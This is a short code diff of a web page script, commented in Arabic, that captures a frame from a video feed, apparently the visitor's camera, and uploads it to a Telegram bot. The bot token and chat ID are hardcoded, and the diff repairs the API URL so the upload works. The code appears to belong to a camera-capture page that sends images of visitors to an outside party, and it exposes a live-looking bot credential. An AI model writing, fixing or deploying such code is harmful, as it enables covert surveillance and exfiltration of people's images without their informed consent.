@@ -26,17 +26,26 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(blob => {
         const formData = new FormData();
-        formData.append('chat_id', '1702324511'); // ضع الـ Chat ID هنا
+        formData.append('chat_id', '1702324511'); // تم استبدال الـ Chat ID
         formData.append('photo', blob, 'photo.png');
 
-        fetch('https://api.telegram.org/7902247042:AAGhKg-93qflFaPHVrIa6QPwY3ruRVk5Fs4
-/sendPhoto', {
+        fetch('https://api.telegram.org/bot7902247042:AAGhKg-93qflFaPHVrIa6QPwY3ruRVk5Fs4/sendPhoto', {
           method: 'POST',
           body: formData
         })
         .then(response => response.json())
-        .then(data => console.log('تم الإرسال:', data))
-        .catch(error => console.error('خطأ:', error));
+        .then(data => {
+          console.log('تم الإرسال:', data);
+          if (data.ok) {
+            alert('تم إرسال الصورة بنجاح');
+          } else {
+            alert('حدث خطأ أثناء إرسال الصورة: ' + JSON.stringify(data));
+          }
+        })
+        .catch(error => {
+          console.error('خطأ:', error);
+          alert('حدث خطأ أثناء الإرسال');
+        });
       }, 'image/png');
     }
   </script>
